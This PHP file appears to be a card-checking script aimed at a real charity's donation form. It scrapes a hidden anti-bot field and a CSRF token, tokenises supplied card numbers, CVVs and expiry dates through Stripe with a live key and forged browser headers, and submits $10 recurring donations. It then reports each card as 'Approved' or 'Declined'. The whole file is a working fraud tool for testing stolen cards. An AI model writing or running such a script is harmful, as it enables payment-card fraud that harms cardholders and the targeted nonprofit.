<?php
error_reporting(0);
require __DIR__ . '/Main/Init.php';

$resp = $curl->get('https://uaacc.org/donate/',
    [    
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: en-US,en;q=0.9',
        'cache-control: no-cache',
        'dnt: 1',
        'pragma: no-cache',
        'priority: u=0, i',
        'sec-fetch-dest: document',
        'sec-fetch-mode: navigate',
        'sec-fetch-site: none',
        'sec-fetch-user: ?1',
        'upgrade-insecure-requests: 1'
    ]
);

$re = '/jd_invisible_to_visitors.+\n.+name="(.+)"\svalue="/m';

preg_match_all($re, $resp, $matches);

$ctok = $matches[1][0];
$cctok = $init->parseString($resp, 'name="'.$ctok.'" value="','"');
$csrf = $init->parseString($resp, '"csrf.token":"','"}');

sleep(15);

$token = $init->parseString($curl->post('https://api.stripe.com/v1/tokens',
    'key=pk_live_QwVC0gWd1fcN2vms5augCYWV00I74Dq5hk&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$year.'&card[name]='.$fname.'+'.$lname.'',
    [    
        'accept: application/json',
        'accept-language: en-US',
        'cache-control: no-cache',
        'content-type: application/x-www-form-urlencoded',
        'dnt: 1',
        'origin: https://js.stripe.com',
        'pragma: no-cache',
        'priority: u=1, i',
        'referer: https://js.stripe.com/',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-site'
    ]
), '"id": "','"');

$resp = $curl->post('https://uaacc.org/donate',
    'amount=10&r_frequency=m&r_times=&first_name='.$fname.'&last_name='.$lname.'&address='.$street.'&city='.$city.'&state='.$state.'&zip='.$zip.'&phone='.$phone.'&email='.$email.'&comment=g&gross_amount=10&sq_billing_zipcode=&x_card_num=&exp_month='.$mm.'&exp_year='.$year.'&x_card_code=&card_type='.$typem.'&card_holder_name=&payment_method=os_stripe&validate_form_login=0&receive_user_id=&field_campaign=0&amount_by_campaign=10&enable_recurring=1&count_method=1&current_campaign=0&donation_page_url=&nonce=&task=donation.process&smallinput=form-control input-medium&activate_dedicate=0&show_summary=1&jd_my_own_website_name=&'.$ctok.'='.$cctok.'&currency_code=USD&'.$csrf.'=1&root_path=https://uaacc.org/&stripeToken='.$token.'',
    [    
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: en-US,en;q=0.9',
        'cache-control: no-cache',
        'content-Type: application/x-www-form-urlencoded',
        'dnt: 1',
        'origin: https://uaacc.org',
        'pragma: no-cache',
        'priority: u=0, i',
        'referer: https://uaacc.org/donate/',
        'sec-fetch-dest: document',
        'sec-fetch-mode: navigate',
        'sec-fetch-site: same-origin',
        'upgrade-insecure-requests: 1'
    ]
);

//$curl->debug();
$msg = $init->parseString($resp, '<div class="jd-message">','</div>');
if(empty($msg)) $msg = $init->parseString($resp, '<h2 class="error-message">','.');

/** Set Response */
if (strpos($resp, '<title>Donation Completed</title>')) $curl->setResponse('Approved', "AUTHORIZED");
else $curl->setResponse('Declined', $msg);

/** Delete Cookies */
$curl->deleteCookie();